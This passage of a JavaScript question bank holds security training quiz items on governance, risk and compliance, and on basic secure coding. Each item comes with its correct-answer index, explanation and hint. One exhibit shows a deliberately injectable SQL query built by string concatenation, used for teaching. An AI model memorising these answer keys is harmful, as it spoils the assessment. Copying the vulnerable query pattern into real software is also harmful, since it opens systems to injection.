    correct: 3, why: "Knowing what data exists and who owns it drives proportionate controls.",
    hint: "Data drives controls."
  },
  {
    id: 538, rank: 3, role: "grc", topic: "Control Rationalisation", difficulty: "EXPERT",
    q: "A framework review finds 600 controls, many duplicated across standards. What is the BEST action?",
    options: ["Create a unified control library with mappings and retire duplicates","Keep all, and test each separately","Add a new framework to fix it","Remove controls randomly, and revisit the decision after the next release"],
    correct: 0, why: "Keeping and testing all separately is the runner-up as nothing is lost, but it wastes effort and hides gaps.",
    hint: "Unify and map."
  },
  {
    id: 539, rank: 3, role: "grc", topic: "Culture Measurement", difficulty: "EXPERT",
    q: "Which approach best measures security culture?",
    options: ["The number of posters displayed around the offices during the awareness month","The number of phishing emails that the mail gateway blocked during the past year","Behaviour measures such as reporting rates and survey trends","The number of policies signed by employees during the annual onboarding session"],
    correct: 2, why: "Culture is shown in behaviours and attitudes, not artefacts.",
    hint: "Behaviour."
  },
  {
    id: 540, rank: 3, role: "grc", topic: "Incident Governance Escalation", difficulty: "EXPERT",
    q: "What should the incident governance model define for a severe data breach?",
    options: ["Only the technical tools that the response team uses during the first hour","Decision rights, notification duties and who may accept risk","Only the list of vendors that the company has used to supply security tools","Only the date of the next meeting of the incident response working group"],
    correct: 1, why: "Roles and decision authority speed up critical decisions.",
    hint: "Decision rights."
  },
  {
    id: 541, rank: 3, role: "grc", topic: "Regulator Engagement", difficulty: "EXPERT",
    q: "What is the best approach when a regulator asks questions after an incident?",
    options: ["Reply from each team separately, and every question gets a quick answer","Delay indefinitely until the regulator has stopped asking for any information","Provide the regulator with the team's speculation about the possible causes","Coordinate one factual response through legal and compliance"],
    correct: 3, why: "Consistent accurate responses protect credibility and reduce legal risk.",
    hint: "One accurate voice."
  },
  {
    id: 542, rank: 3, role: "grc", topic: "Supplier Concentration Strategy", difficulty: "EXPERT",
    q: "An outage at one cloud provider would stop all critical services. What is the BEST resilience decision?",
    options: ["Move everything to one cheaper provider, and review the outcome at the next monthly meeting","Accept the risk without analysis","Add a second contract with the same provider, until the next scheduled review takes place","Assess exit and multi-region or multi-provider options against impact tolerance and cost"],
    correct: 3, why: "Accepting it without analysis is the runner-up because redundancy is costly, but the decision must be informed by tolerance and cost.",
    hint: "Evaluate options."
  },
  {
    id: 543, rank: 3, role: "grc", topic: "Security Metrics Architecture", difficulty: "EXPERT",
    q: "What makes a metrics programme sustainable?",
    options: ["Ad hoc requests","Vanity charts","Defined sources, owners and automated collection tied to decisions, in most cases","Manual copying into slides"],
    correct: 2, why: "Reliable and automated measures can be repeated and trusted.",
    hint: "Owned and automated."
  },
  {
    id: 544, rank: 3, role: "grc", topic: "Merger Integration Governance", difficulty: "EXPERT",
    q: "Which control is most important during integration of an acquired company's IT?",
    options: ["Delaying all assessments","Interim risk assessment, access limits and phased connection","Ignoring differences, and review the outcome at the next monthly meeting","Immediate full network merger"],
    correct: 1, why: "Staged integration prevents inheriting unmanaged risk.",
    hint: "Phase it."
  },
  {
    id: 545, rank: 3, role: "grc", topic: "Records and eDiscovery", difficulty: "EXPERT",
    q: "What does good governance of electronic records support during litigation?",
    options: ["Locating and preserving relevant data defensibly","Moving it offshore","Deleting everything quickly, in the first instance","Hiding data"],
    correct: 0, why: "Defensible preservation and retrieval reduce legal risk.",
    hint: "Find and preserve."
  },
  {
    id: 546, rank: 3, role: "grc", topic: "GRC Tool Selection", difficulty: "EXPERT",
    q: "A company wants a GRC platform. What should BEST drive the choice?",
    options: ["The cheapest licence","The most features","The vendor's marketing slides","Defined process and data requirements, integration and owner adoption, in most cases"],
    correct: 3, why: "Most features is the runner-up because it seems safe, but unused features add cost and complexity; requirements and adoption decide success.",
    hint: "Requirements first."
  },
  {
    id: 547, rank: 3, role: "grc", topic: "Control Testing Strategy", difficulty: "EXPERT",
    q: "How should control testing frequency be set?",
    options: ["Only when auditors ask","Based on control criticality, risk and past failures, in most cases","Randomly","Equal for all controls"],
    correct: 1, why: "Risk-based testing concentrates assurance where failure matters most.",
    hint: "Risk-based."
  },
  {
    id: 548, rank: 3, role: "grc", topic: "Executive Accountability", difficulty: "EXPERT",
    q: "Which arrangement best secures executive accountability for cyber risk?",
    options: ["Delegating all responsibility to the security team, as soon as practical","Assigning risk to IT only","No named owners","Named executive risk owners reporting against appetite to the board"],
    correct: 3, why: "Accountability requires decision authority and reporting.",
    hint: "Named owners."
  },
  {
    id: 549, rank: 3, role: "grc", topic: "Policy Compliance Automation", difficulty: "EXPERT",
    q: "Which approach best enforces a policy on encryption of cloud storage?",
    options: ["A paper form","A reminder email","Policy-as-code guardrails that prevent or flag non-compliant resources","A yearly workshop"],
    correct: 2, why: "Technical enforcement scales and is auditable.",
    hint: "Enforce in code."
  },
  {
    id: 550, rank: 3, role: "grc", topic: "Customer Audit Management", difficulty: "EXPERT",
    q: "Customers increasingly request on-site audits. What is the best programme response?",
    options: ["Offer independent reports, a trust centre and a defined audit process","Allow unlimited unplanned access to the production systems for any customer","Refuse all customer audits, and security questionnaires as a matter of policy","Send customers raw logs, and configuration files whenever they ask for evidence"],
    correct: 0, why: "Standard assurance reduces the load while meeting needs.",
    hint: "Standard assurance."
  },
  {
    id: 551, rank: 3, role: "grc", topic: "Risk Interdependencies", difficulty: "EXPERT",
    q: "Why should risk assessments consider interdependencies between risks?",
    options: ["One failure can trigger or amplify others, creating larger impact","It reduces reporting","It is required by font rules","Risks are always independent"],
    correct: 0, why: "Cascading effects can exceed the sum of individual risks.",
    hint: "Cascades."
  },
  {
    id: 552, rank: 3, role: "grc", topic: "Whistleblower Programme Design", difficulty: "EXPERT",
    q: "Which design feature most builds trust in a reporting channel?",
    options: ["Public names of reporters","No follow-up","Independent handling, confidentiality and protection from retaliation, as a general rule","Management reading every report"],
    correct: 2, why: "Trust depends on independence and protection.",
    hint: "Independent and safe."
  },
  {
    id: 553, rank: 3, role: "grc", topic: "Third-Party Incident Notification", difficulty: "EXPERT",
    q: "How should contracts handle supplier breach notification?",
    options: ["Omit it","Define timelines, content and cooperation duties aligned to your own legal deadlines","Require notice only after investigation, and review the outcome at the next monthly meeting","Allow the supplier to decide"],
    correct: 1, why: "Your regulatory clock requires timely information from suppliers.",
    hint: "Align the clock."
  },
  {
    id: 554, rank: 3, role: "grc", topic: "Compliance Debt", difficulty: "EXPERT",
    q: "What is compliance debt?",
    options: ["Accumulated unaddressed gaps and exceptions that raise future cost and risk","A financial loan","A fine","A tool"],
    correct: 0, why: "Delayed remediation compounds like technical debt.",
    hint: "Backlog of gaps."
  },
  {
    id: 555, rank: 3, role: "grc", topic: "Sustainability of Controls", difficulty: "EXPERT",
    q: "A heavy manual control keeps failing because staff skip steps. What is the BEST redesign?",
    options: ["Train staff again every month, then record the result in the ticket","Add more sign-off steps, until the next scheduled review takes place","Simplify or automate the control and embed it in the workflow","Punish failures"],
    correct: 2, why: "More training is the runner-up because it addresses behaviour, but a control that relies on memory will keep failing.",
    hint: "Fix the design."
  },
  {
    id: 556, rank: 3, role: "grc", topic: "Data Subject Request Automation", difficulty: "EXPERT",
    q: "Which design best scales handling of data subject requests?",
    options: ["Email handled by one person","A request workflow with identity verification and automated discovery across systems","Refusing requests","Spreadsheet only"],
    correct: 1, why: "Automation and a data map reduce time and errors.",
    hint: "Workflow and discovery."
  },
  {
    id: 557, rank: 3, role: "grc", topic: "Cross-Functional Risk Forum", difficulty: "EXPERT",
    q: "Why create a risk forum with security, legal, privacy, IT and business members?",
    options: ["To increase meetings","Risks cross functions and need consistent shared decisions","To avoid documentation","To reduce independence"],
    correct: 1, why: "Combined views avoid siloed decisions.",
    hint: "Cross-functional."
  },
  {
    id: 558, rank: 3, role: "grc", topic: "Assurance Reporting to Audit Committee", difficulty: "EXPERT",
    q: "What should the audit committee receive about cyber assurance?",
    options: ["Every log","Coverage, results, themes and overdue actions against risk, in most cases","Vendor brochures","Technical configurations"],
    correct: 1, why: "Committees oversee assurance quality and remediation.",
    hint: "Coverage and overdue."
  },
  {
    id: 559, rank: 3, role: "grc", topic: "Risk Culture Incentives", difficulty: "EXPERT",
    q: "Which incentive structure most supports good risk management?",
    options: ["Ignoring risk in bonuses, and revisit the decision after the next release","Rewarding only speed","Punishing all incidents equally","Rewarding early reporting and fixing, not only delivery speed"],
    correct: 3, why: "Incentives shape behaviour, so reporting must be encouraged.",
    hint: "Reward reporting."
  },
  {
    id: 560, rank: 3, role: "grc", topic: "Control Inheritance in Cloud", difficulty: "EXPERT",
    q: "A team claims its application inherits all compliance controls from the cloud provider's certification. What is the best governance challenge?",
    options: ["Check which controls are provider-owned and which the team must implement","Accept the claim as stated, and review the outcome at the next monthly meeting","Ask the provider to sign the team's audit, then record the result in the ticket","Reject cloud use"],
    correct: 0, why: "Provider certifications cover its layer only; customer-side controls remain the team's responsibility.",
    hint: "Shared duties."
  },
  {
    id: 561, rank: 4, role: "grc", topic: "Systemic Cyber Risk", difficulty: "EXPERT",
    q: "A regulator asks about systemic risk from shared third-party software across the financial sector. What does systemic risk mean here?",
    options: ["A bug in one firm's login page that affects only its own staff","A delay in the production of the annual audit report this quarter, in most cases","Failure of one common provider causing simultaneous harm across many firms","A rise in the number of staff leaving a firm during one year, as a general rule"],
    correct: 2, why: "Common dependencies create correlated failures that single-firm controls cannot contain.",
    hint: "Correlated failure."
  },
  {
    id: 562, rank: 4, role: "grc", topic: "Risk Aggregation", difficulty: "EXPERT",
    q: "Ten business units each report a risk within appetite, but they all depend on the same data centre. What is the BEST board-level conclusion?",
    options: ["Move the data centre to another site straight away without a review of the options","Accept the reports as each unit is individually within the agreed appetite","Aggregate the exposure, as shared dependency may exceed appetite","Ask each unit to lower its own risk score until the shared total looks acceptable, where that is practical"],
    correct: 2, why: "Accepting the unit views is the runner-up since each follows the rules, but correlated exposure only appears when aggregated.",
    hint: "Aggregate dependencies."
  },
  {
    id: 563, rank: 4, role: "grc", topic: "Regulatory Divergence", difficulty: "EXPERT",
    q: "Two regulators impose conflicting data localisation and law-enforcement access rules on one global service. What is the best strategic approach?",
    options: ["Wait to be fined, and then negotiate with each of the regulators separately","Move all of the data to a single country without a review of either regime, until the next scheduled review takes place","Engage legal and regulators, segment by jurisdiction and record the decision","Ignore the weaker regulator, and follow only the one with the larger fines"],
    correct: 2, why: "Conflicts need legal analysis, architectural options and documented executive decisions.",
    hint: "Segment and document."
  },
  {
    id: 564, rank: 4, role: "grc", topic: "Board Liability Awareness", difficulty: "EXPERT",
    q: "Directors ask what personal accountability they have for cyber oversight. Which statement is the most accurate for most jurisdictions?",
    options: ["They must oversee with proper information and cannot fully delegate","They are personally responsible for every technical decision taken by the IT team","They have no responsibility, as cyber security is purely a technical matter","Only the CISO carries responsibility, as the board does not employ technical staff"],
    correct: 0, why: "Boards are expected to oversee risk with adequate information and challenge.",
    hint: "Informed oversight."
  },
  {
    id: 565, rank: 4, role: "grc", topic: "Quantified Appetite Calibration", difficulty: "EXPERT",
    q: "The board's appetite is 'no more than 5 million loss per year at 90 percent confidence'. The model shows 7 million. What is the BEST response?",
    options: ["Raise the appetite figure quietly without any discussion with the directors, in most cases","Change the model assumptions until the result shows five million or lower, as a general rule","Present options to reduce exposure or formally accept the higher figure, as a general rule","Hide the result from the board until the next annual modelling exercise is complete"],
    correct: 2, why: "Changing assumptions is the runner-up since it resolves the gap on paper, but it is manipulation, not risk management.",
    hint: "Decide openly."
  },
  {
    id: 566, rank: 4, role: "grc", topic: "Model Risk in Security Analytics", difficulty: "EXPERT",
    q: "A vendor risk-scoring model rates suppliers automatically. What governance control is most important?",
    options: ["Trust the vendor's scores as the vendor built the model, and knows it well","Use the model once at the start, and never review the results again afterwards","Hide the scores from suppliers, and they cannot argue about the results","Validation, documented assumptions and human challenge, as a general rule"],
    correct: 3, why: "Models can embed bias and errors, so they need validation and oversight.",
    hint: "Validate and challenge."
  },
  {
    id: 567, rank: 4, role: "grc", topic: "Emerging Technology Risk", difficulty: "EXPERT",
    q: "A business plans to adopt quantum-vulnerable cryptography for data that must stay confidential for 20 years. Which GRC action is most appropriate?",
    options: ["Add a crypto inventory, and migration plan with owners, in the first instance","Reduce the retention period of that data to zero, and it is never stored","Wait until quantum computers exist, and then decide how to react at that point","Ignore the data as no practical attack exists against it at the moment, and revisit the decision after the next release"],
    correct: 0, why: "Long-lived data creates harvest-now-decrypt-later risk that needs planning today.",
    hint: "Plan the migration."
  },
  {
    id: 568, rank: 4, role: "grc", topic: "Digital Operational Resilience Testing", difficulty: "EXPERT",
    q: "A regulation requires advanced testing of critical ICT systems. What should the programme include?",
    options: ["A yearly vulnerability scan of the internet-facing systems carried out by the IT team","A telephone survey of staff about how confident they feel about the recovery plans","A review of the policy documents by the compliance team before each audit season, in most cases","Threat-led testing of critical functions with independent oversight, as a general rule"],
    correct: 3, why: "Regulated resilience testing is threat-led and linked to important business services.",
    hint: "Threat-led."
  },
  {
    id: 569, rank: 4, role: "grc", topic: "Ethics of Offensive Disclosure", difficulty: "EXPERT",
    q: "A security researcher reports a serious flaw and threatens public disclosure in 7 days. What is the BEST governance response?",
    options: ["Acknowledge, triage, involve legal and agree a disclosure timeline, as a general rule","Ignore the report as the researcher is not a customer of the company","Threaten legal action first, and the researcher does not publish anything at all","Pay the researcher quietly, and ask them to sign an agreement to stay silent, and revisit the decision after the next release"],
    correct: 0, why: "Threatening legal action is the runner-up since it protects reputation, but it usually escalates; coordination protects users.",
    hint: "Coordinate."
  },
  {
    id: 570, rank: 4, role: "grc", topic: "Supply Chain Transparency", difficulty: "EXPERT",
    q: "What does a software bill of materials help governance teams do?",
    options: ["Calculate the tax due on each product line sold in every country each quarter, in most cases","Replace the need for testing the software before it is released to customers","Count the staff who work on each product team across the whole organisation","Identify components, and assess exposure after a disclosure, as soon as practical"],
    correct: 3, why: "SBOMs make dependency risk visible and searchable.",
    hint: "Know the components."
  },
  {
    id: 571, rank: 4, role: "grc", topic: "Risk Transfer Limits", difficulty: "EXPERT",
    q: "After a breach the insurer denies a claim because MFA was stated as enforced but was not. What governance lesson applies?",
    options: ["Never buy cyber insurance again as insurers always refuse to pay claims","Represent controls accurately and verify claims made, as a general rule","Sue the broker for the denied claim before checking what the application said","Hide weak controls from the insurer, and the premium stays as low as possible"],
    correct: 1, why: "Misrepresentation can void cover, so statements must be evidenced.",
    hint: "Accurate statements."
  },
  {
    id: 572, rank: 4, role: "grc", topic: "Security Investment Prioritisation", difficulty: "EXPERT",
    q: "The security budget is cut by 30 percent. Which approach is most defensible?",
    options: ["Cut detection, and response first as they do not prevent any attacks directly","Cut an equal share from every team, and nobody feels treated unfairly","Rank controls by risk reduced per cost and show residual risk","Cut security training only, as staff awareness never changes real outcomes"],
    correct: 2, why: "Transparent risk-based trade-offs allow informed executive decisions.",
    hint: "Risk per cost."
  },
  {
    id: 573, rank: 4, role: "grc", topic: "Privacy and AI Training Data", difficulty: "EXPERT",
    q: "The company wants to train an internal model on customer support transcripts. What is the BEST governance step before starting?",
    options: ["Start training, and fix problems later","Assess lawful basis and minimisation and complete a DPIA","Remove the privacy notice from the website, and customers do not ask questions","Use all of the data without a review, as it already belongs to the company"],
    correct: 1, why: "Starting first is the runner-up since it speeds delivery, but unlawful processing creates obligations that are hard to undo.",
    hint: "Assess before using."
  },
  {
    id: 574, rank: 4, role: "grc", topic: "Control Effectiveness Evidence", difficulty: "EXPERT",
    q: "A control shows 100 percent compliance for three years. What should an expert assurance function do?",
    options: ["Stop testing the control, as three clean years show that it is no longer needed","Congratulate the owner, and use the result as an example for other teams to follow","Reduce the scope of the control, and the perfect record is easier to keep","Test whether the control and its measure can really fail"],
    correct: 3, why: "Perfect results may signal weak tests or measurement rather than strong control.",
    hint: "Test the test."
  },
  {
    id: 575, rank: 4, role: "grc", topic: "Cross-Border Incident Reporting", difficulty: "EXPERT",
    exhibit: "Jurisdiction | Authority | Threshold | Deadline\nEU (GDPR) | Lead SA | Risk to individuals | 72h\nUK | ICO | Risk to individuals | 72h\nSG | PDPC | Significant harm | 3 days\nUS-NY | AG/DFS | Covered events | 72h",
    q: "An incident affects customers in 12 countries with different reporting deadlines. What is the best preparation?",
    options: ["Hire a specialist consultant after the incident to work out who must be told","Report whenever the team finds it convenient once the technical work is finished","A notification matrix of regulators, thresholds and deadlines, as a general rule","Report only in the home country and leave the other countries to find out later, as a general rule"],
    correct: 2, why: "Pre-built obligations let the team act within the clock.",
    hint: "Notification matrix."
  },
  {
    id: 576, rank: 4, role: "grc", topic: "Resilience Tolerance Setting", difficulty: "EXPERT",
    q: "How should impact tolerance for an important business service be set?",
    options: ["By the maximum disruption before intolerable harm occurs, in most cases","By leaving the business out of the discussion, and IT can decide alone","By choosing the shortest time that the technical team thinks is achievable","By copying the recovery time from the cloud vendor's standard service agreement"],
    correct: 0, why: "Tolerance is expressed in terms of harm, not IT convenience.",
    hint: "Harm-based."
  },
  {
    id: 577, rank: 4, role: "grc", topic: "Algorithmic Accountability", difficulty: "EXPERT",
    q: "An automated decision system denies credit to some applicants. What is the best governance arrangement?",
    options: ["Avoid keeping logs, and nobody can later challenge the decisions in detail","Named owners, bias testing, explanations and an appeal route, in most cases","Keep the decision rules secret from applicants, and from the internal auditors","Let the vendor handle all questions about how the decisions are made, and reviewed"],
    correct: 1, why: "Accountability requires oversight, transparency and recourse.",
    hint: "Owners and appeal."
  },
  {
    id: 578, rank: 4, role: "grc", topic: "Control Obsolescence", difficulty: "EXPERT",
    q: "Why must GRC review whether old controls are still needed?",
    options: ["Controls never change once they have been approved by the risk committee","Auditors prefer older controls as they have a longer record of evidence","Old controls are free to run, and there is no cost in keeping all of them","Business and threat change make controls redundant or weak"],
    correct: 3, why: "Periodic review keeps controls aligned to current risk.",
    hint: "Re-justify controls."
  },
  {
    id: 579, rank: 4, role: "grc", topic: "Third-Party Fourth Party", difficulty: "EXPERT",
    q: "A critical supplier relies on a small subcontractor you have no contract with. What is the BEST way to manage this fourth-party risk?",
    options: ["Terminate the supplier at once, and look for another one with no subcontractors","Ignore it as there is no contract","Contact the subcontractor directly without telling the supplier that you have done and","Require visibility and flow-down terms, and assess critical subcontractors"],
    correct: 3, why: "Ignoring it is the runner-up as you have no direct control, but supplier dependencies can still disrupt your service.",
    hint: "Flow down terms."
  },
  {
    id: 580, rank: 4, role: "grc", topic: "Risk Reporting Integrity", difficulty: "EXPERT",
    q: "A manager asks to change a risk rating before a board meeting because it looks bad. What should the GRC function do?",
    options: ["Delete the risk from the register, and it does not appear in the board paper","Change the rating to the value that the manager has asked for before the meeting","Delay the board meeting until the manager has found a better looking score","Keep the rating evidence-based, record the challenge and escalate"],
    correct: 3, why: "Integrity of reporting is fundamental to oversight.",
    hint: "Evidence decides."
  },
  {
    id: 581, rank: 4, role: "grc", topic: "Evidence of Decision Making", difficulty: "EXPERT",
    q: "Why should significant risk acceptance decisions be documented?",
    options: ["To make the files longer and the audit team has more to read, and sample","To show who decided, on what information and for how long, as a general rule","To limit board discussion by showing that the matter has already been settled","To please the auditors only, as nobody else will ever read the decision record"],
    correct: 1, why: "Decision records support accountability and review.",
    hint: "Who, what, how long."
  },
  {
    id: 582, rank: 4, role: "grc", topic: "Climate and Physical Risk", difficulty: "EXPERT",
    q: "A data centre sits in a flood zone. Which governance action is most appropriate?",
    options: ["Include physical hazards in resilience and location planning","Remove the data centre immediately without checking the effect on services","Rely on good luck, and renew the insurance policy when the next renewal falls due","Ignore it, as the cyber team only covers logical risks to systems and data"],
    correct: 0, why: "Operational resilience includes physical and environmental threats.",
    hint: "Include physical risk."
  },
  {
    id: 583, rank: 4, role: "grc", topic: "Control Self-Deception", difficulty: "EXPERT",
    q: "Which sign most suggests a compliance culture focused on paperwork rather than risk?",
    options: ["Owners challenge weak controls openly and propose changes at the committee, as a general rule","Findings are closed only after a root cause fix has been tested, and confirmed","Controls produce evidence continuously, and the results are reviewed every week","Evidence appears just before audits and controls fail between them, in most cases"],
    correct: 3, why: "Pre-audit rushes show controls are not embedded.",
    hint: "Audit rush."
  },
  {
    id: 584, rank: 4, role: "grc", topic: "Ransomware Payment Policy", difficulty: "EXPERT",
    q: "A policy states 'we never pay ransoms'. An outbreak threatens patient safety. What is the BEST governance position?",
    options: ["Follow the policy blindly, as a general rule","Pre-define decision criteria and authority with legal advice for exceptional cases","Pay immediately","Let the IT team decide alone, in the first instance"],
    correct: 1, why: "Following blindly is the runner-up as it is clear, but extreme cases need a pre-agreed decision path, including legal limits such as sanctions.",
    hint: "Pre-agree the path."
  },
  {
    id: 585, rank: 4, role: "grc", topic: "Metrics Gaming", difficulty: "EXPERT",
    q: "Tickets for vulnerabilities are closed quickly but reopened later. What is the best governance response?",
    options: ["Reward the closing speed of tickets, and the backlog falls as quickly as possible","Ignore the pattern, as the closing numbers already meet the target agreed last year","Measure verified remediation and reopen rates","Delete reopened tickets from the report, and the trend looks cleaner to readers"],
    correct: 2, why: "Metrics must reflect real outcomes to avoid gaming.",
    hint: "Verified fixes."
  },
  {
    id: 586, rank: 4, role: "grc", topic: "Strategic Privacy Risk", difficulty: "EXPERT",
    q: "A company wants to combine datasets from several services to profile customers. Which risk is most important to assess early?",
    options: ["Colour scheme","Purpose limitation and unexpected use of personal data","Server brand, in most cases","File size, in most cases"],
    correct: 1, why: "Combining data can break expectations and legal bases.",
    hint: "Purpose limits."
  },
  {
    id: 587, rank: 4, role: "grc", topic: "Governance of Open Source", difficulty: "EXPERT",
    q: "A critical product depends on an unmaintained open-source library. What is the best risk decision process?",
    options: ["Delete the product","Ignore it","Assess criticality and options such as replacing, forking or funding with an owner and date","Wait for an incident, as a first step"],
    correct: 2, why: "Dependency risk needs an owned treatment decision.",
    hint: "Decide an option."
  },
  {
    id: 588, rank: 4, role: "grc", topic: "Insider Risk Ethics", difficulty: "EXPERT",
    q: "What principle should limit an insider risk programme?",
    options: ["Maximum monitoring","Proportionality with transparency, legal basis and independent oversight","Secret monitoring of all","No oversight"],
    correct: 1, why: "Programmes affect individuals' rights and need safeguards.",
    hint: "Proportionate."
  },
  {
    id: 589, rank: 4, role: "grc", topic: "Resilience of Governance", difficulty: "EXPERT",
    q: "If the CISO is unavailable during a crisis, what should governance have in place?",
    options: ["Deputies and documented decision authority with tested succession","Ask the most junior member of the team to take every decision on the day","Wait for the CISO to return before any decision about the incident is made","Close the SOC until a senior person is available to make the final decisions"],
    correct: 0, why: "Continuity of leadership prevents paralysis.",
    hint: "Succession."
  },
  {
    id: 590, rank: 4, role: "grc", topic: "Assurance Over AI Vendors", difficulty: "EXPERT",
    q: "A vendor claims its AI product is safe and unbiased. What is the BEST assurance approach?",
    options: ["Ban all AI vendors, as a general rule","Request evidence such as testing results, governance documents and contractual commitments and test it yourself","Rely on marketing material","Accept the claim"],
    correct: 1, why: "Accepting the claim is the runner-up as evaluating is costly, but unverified claims leave the risk with you.",
    hint: "Evidence and own testing."
  },
  {
    id: 591, rank: 4, role: "grc", topic: "Climate of Reporting", difficulty: "EXPERT",
    q: "Why might staff hide small incidents?",
    options: ["Fear of blame or lack of visible follow-up","Because hiding minor problems saves the team a lot of time during busy weeks, as a general rule","Because the policies forbid staff from reporting anything without manager consent","Because incidents are impossible in a well run organisation with good policies"],
    correct: 0, why: "A blame culture suppresses early warning.",
    hint: "Fear of blame."
  },
  {
    id: 592, rank: 4, role: "grc", topic: "Control Cost Transparency", difficulty: "EXPERT",
    q: "Which information best helps executives decide whether to keep an expensive control?",
    options: ["Its colour, as a general rule","Risk it reduces, its cost, alternatives and residual risk if removed","Its age","Its brand name, in most cases"],
    correct: 1, why: "Transparent trade-offs allow justified decisions.",
    hint: "Risk and cost."
  },
  {
    id: 593, rank: 4, role: "grc", topic: "Regulatory Sandbox Use", difficulty: "EXPERT",
    q: "A regulator offers a sandbox for a new fintech product. What is the key governance benefit?",
    options: ["Avoiding all of the rules that normally apply to regulated financial products, then record the result in the ticket","Hiding the customer data from the regulator while the product is being piloted","Testing innovation with regulatory dialogue, and limited exposure, until the next scheduled review takes place","Skipping the audits that would otherwise be needed before the product launch date"],
    correct: 2, why: "Sandboxes allow experimentation under supervision.",
    hint: "Supervised testing."
  },
  {
    id: 594, rank: 4, role: "grc", topic: "Technology Concentration Audit", difficulty: "EXPERT",
    q: "What should an audit of cloud concentration risk examine?",
    options: ["Dependencies, exit plans, tested alternatives and impact tolerances","Brand preferences, as a general rule","Server names, in most cases","Logo colours, as a general rule"],
    correct: 0, why: "Evidence of exit feasibility shows genuine resilience.",
    hint: "Exit and test."
  },
  {
    id: 595, rank: 4, role: "grc", topic: "Executive Decision Quality", difficulty: "EXPERT",
    q: "Which practice most improves the quality of risk decisions by executives?",
    options: ["Hiding uncertainty, as a general rule","One recommendation only, as a general rule","Long technical appendices, as a general rule","Presenting options, trade-offs and uncertainties with independent challenge"],
    correct: 3, why: "Good decisions need clear options and challenge.",
    hint: "Options and challenge."
  },
  {
    id: 596, rank: 4, role: "grc", topic: "Cyber War Exclusion", difficulty: "EXPERT",
    q: "An insurance policy excludes losses from state-backed attacks. What should risk governance do?",
    options: ["Clarify the wording, quantify the exposure and plan mitigations, as a general rule","Assume the insurer will cover any loss that is not obviously caused by a state","Cancel the policy at once, and rely on the reserves held by the finance team, in most cases","Ignore the clause as such attacks have never happened to this company"],
    correct: 0, why: "Ambiguous exclusions leave unexpected gaps.",
    hint: "Clarify and quantify."
  },
  {
    id: 597, rank: 4, role: "grc", topic: "Data Breach Accountability", difficulty: "EXPERT",
    q: "After a breach, which accountability outcome best supports learning?",
    options: ["Close without actions, and review the outcome at the next monthly meeting","Hide the cause, as soon as practical","Focus on systemic causes and corrective actions with fair individual accountability","Blame the nearest person"],
    correct: 2, why: "Learning cultures fix systems while holding people fairly accountable.",
    hint: "Systems and fairness."
  },
  {
    id: 598, rank: 4, role: "grc", topic: "Scenario Analysis", difficulty: "EXPERT",
    q: "What is the value of scenario analysis for cyber governance?",
    options: ["Replacing audits, and review the outcome at the next monthly meeting","Testing decisions and exposures against plausible severe events","Predicting exact dates of attacks, then record the result in the ticket","Removing uncertainty, as soon as practical"],
    correct: 1, why: "Scenarios explore impact and response readiness.",
    hint: "Plausible severe events."
  },
  {
    id: 599, rank: 4, role: "grc", topic: "Concentration in Security Tooling", difficulty: "EXPERT",
    q: "A company's detection, identity and email security all come from one vendor. What is the main risk to assess?",
    options: ["A single vendor failure or compromise affecting several controls at once","Fewer reports for the board to read","Simpler training for the SOC team, as a general rule","Lower licence prices from the vendor"],
    correct: 0, why: "Consolidation reduces complexity but creates a common point of failure and a high-value target.",
    hint: "One vendor, many controls."
  },
  {
    id: 600, rank: 4, role: "grc", topic: "Assurance Over Self-Reported Data", difficulty: "EXPERT",
    q: "Business units self-report control status monthly. Which design best preserves the reliability of the reports?",
    options: ["Reduce reporting to once a year, and revisit the decision after the next release","Trust the units entirely","Ask units to report in different formats","Sample-based independent validation of reported results"],
    correct: 3, why: "Independent sampling detects optimistic reporting.",
    hint: "Validate samples."
  },
  {
    id: 601, rank: 0, role: "security-engineering", topic: "Parameterised Queries", difficulty: "BEGINNER",
    q: "Which coding practice best prevents SQL injection?",
    options: ["Hiding the database error messages, and building the query as before","Building queries by joining strings with the user's text as typed","Removing the word SELECT from any input the user supplies","Parameterised queries that keep user input separate from SQL code"],
    correct: 3, why: "Parameters are sent as data, so the database never treats input as part of the command.",
    hint: "Data stays data."
  },
  {
    id: 602, rank: 0, role: "security-engineering", topic: "Reviewing a Query", difficulty: "BEGINNER",
    exhibit: "query = \"SELECT * FROM users WHERE name = '\" + request.args['name'] + \"'\"\ncursor.execute(query)",
    q: "What is wrong with this code?",
    options: ["It is written in a language that is too old for the database driver","It joins user input into the SQL text, allowing injection","It uses the wrong colour for strings and and the editor cannot highlight it","It opens too many files at once, and exhausts the process resources"],
    correct: 1, why: "Concatenating untrusted input into SQL lets attackers change the query logic.",
    hint: "Look at the string join."
  },
  {
    id: 603, rank: 0, role: "security-engineering", topic: "Least Privilege", difficulty: "BEGINNER",
    q: "What does the principle of least privilege mean?",
    options: ["Allowing each team to decide its own level of access with no review","Giving users and services only the access they need to do their job","Giving every administrator access to all of the systems in the company","Removing every password from the accounts used by the support team"],
    correct: 1, why: "Limiting access reduces the damage from mistakes and compromised accounts.",
    hint: "Only what is needed."
  },
  {
    id: 604, rank: 0, role: "security-engineering", topic: "Password Storage", difficulty: "BEGINNER",
    q: "How should an application store user passwords?",
    options: ["As salted hashes made with a slow algorithm such as bcrypt, as a general rule","As hashes created with a fast algorithm and no salt added to them, in most cases","As plain text, and the support staff can read them when users call","Encrypted with one key that every developer on the team knows and uses, in most cases"],
    correct: 0, why: "Slow salted hashes make stolen password databases expensive to crack.",
    hint: "Slow and salted."
  },
  {
    id: 605, rank: 0, role: "security-engineering", topic: "TLS Purpose", difficulty: "BEGINNER",
    q: "What does TLS protect on a web connection?",
    options: ["The source code in the repository, as a general rule","Confidentiality and integrity of data in transit","The files on the server's disk","The backups in the cloud"],
    correct: 1, why: "TLS encrypts and authenticates traffic between client and server.",
    hint: "In transit."
  },
  {
    id: 606, rank: 0, role: "security-engineering", topic: "Patch Management Basics", difficulty: "BEGINNER",
    q: "Why should security patches be applied promptly?",
    options: ["Attackers quickly use published flaws against unpatched systems","They make the screen look different after the installation has finished","They are needed only once a year to satisfy the licence terms of the vendor","They delete old user accounts that are no longer being used by anyone"],
    correct: 0, why: "Exploits for known flaws often appear within days of disclosure.",
    hint: "Known flaws get exploited."
  },
  {
    id: 607, rank: 0, role: "security-engineering", topic: "Secrets in Source Code", difficulty: "BEGINNER",
    q: "A developer finds an API key committed to a public repository. What is the BEST first action?",
    options: ["Make the repository private and keep the key","Delete the file from the latest commit and carry on, and revisit the decision after the next release","Revoke and rotate the key, then remove it and review the access logs, wherever possible","Tell the team to avoid using that repository, until the next scheduled review takes place"],
